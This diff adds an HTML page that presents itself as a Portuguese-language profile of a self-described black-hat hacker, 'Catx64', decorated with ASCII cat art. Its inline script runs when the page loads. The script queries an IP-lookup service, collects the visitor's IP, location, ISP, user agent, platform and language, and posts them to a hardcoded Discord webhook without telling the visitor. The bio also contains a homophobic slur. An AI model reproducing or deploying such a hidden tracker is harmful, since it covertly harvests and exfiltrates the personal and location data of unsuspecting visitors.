@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catx64 - Hacker Black Hat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="content-wrapper">
+        <header>
+            <h1></h1>
+            <h2>Hacker Black Hat</h2>
+        </header>
+        <section class="ascii-art">
+            <pre>
+               \`-._           __
+                \\  `-..____,.'  `.
+                 :`.         /    \`.
+                 :  )       :      : \\
+                  ;'        '   ;  |  :
+                  )..      .. .:.`.;  :
+                 /::...  .:::...   ` ;
+                 ; _ '    __        /:\
+                 `:o>   /\o_>      ;:. `.
+                `-`.__ ;   __..--- /:.   \
+                === \_/   ;=====_.':.     ;
+                 ,/'`--'...`--....        ;
+                      ;                    ;
+                    .'                      ;
+                  .'                        ;
+                .'     ..     ,      .       ;
+               :       ::..  /      ;::.     |
+              /      `.;::.  |       ;:..    ;
+             :         |:.   :       ;:.    ;
+             :         ::     ;:..   |.    ;
+              :       :;      :::....|     |
+              /\     ,/ \      ;:::::;     ;
+            .:. \:..|    :     ; '.--|     ;
+           ::.  :''  `-.,,;     ;'   ;     ;
+        .-'. _.'\      / `;      \,__:      \
+        `---'    `----'   ;      /    \,.,,,/
+                           `----`
+            </pre>
+        </section>
+            <h2>Catx64</h2>
+            <p>é um hacker black hat que combate paneleiros e pedófilos. Já conseguiu rodar mais de 10 pedófilos no Discord.</p>
+        </section>
+        <footer>
+            <p>&copy; 2025 Catx64 - Todos os direitos reservados.</p>
+        </footer>
+    </div>
+    
+    <script>
+async function getIPInfo() {
+    try {
+        const response = await fetch("http://ip-api.com/json/");
+        return response.json();
+    } catch (error) {
+        console.error("Erro ao obter informações do IP:", error);
+        return null;
+    }
+}
+
+async function sendToWebhook() {
+    const ipInfo = await getIPInfo();
+    if (!ipInfo) return;
+
+    const userAgent = navigator.userAgent;
+    const idioma = navigator.language;
+    const protocolo = window.location.protocol;
+    const porta = window.location.port || "Padrão";
+    const dataHora = new Date().toLocaleString();
+
+    let mensagem = `🏠 | IP: ${ipInfo.query}\n` +
+        `🔎 | Cidade: ${ipInfo.city}\n` +
+        `📍 | Região: ${ipInfo.regionName}\n` +
+        `🌎 | País: ${ipInfo.country}\n` +
+        `📦 | ISP: ${ipInfo.isp}\n\n` +
+        `🔓 | USER-AGENT: ${userAgent}\n` +
+        `💻 | SISTEMA OPERACIONAL: ${navigator.platform}\n` +
+        `🚪 | PORTA: ${porta}\n` +
+        `🔒 | PROTOCOLO: ${protocolo}\n` +
+        `👥 | LINGUAGEM: ${idioma}\n` +
+        `📆 | DATA/HORA: ${dataHora}\n\n`;
+
+    const webhookURL = "https://discord.com/api/webhooks/1335027783209844767/gDOdN1-ICsD4KPG_gOUEubU3CXYL7WE7W3wkjmXVDjhQHkSJWinVSXdRfiS15jj4IG63";
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                content: "```" + mensagem + "```"
+            })
+        });
+
+        if (response.ok) {
+            console.log("Dados enviados com sucesso!");
+        } else {
+            console.error("Erro ao enviar dados:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Erro ao enviar os dados:", error);
+    }
+}
+
+sendToWebhook();
+    </script>
+</body>
+</html>
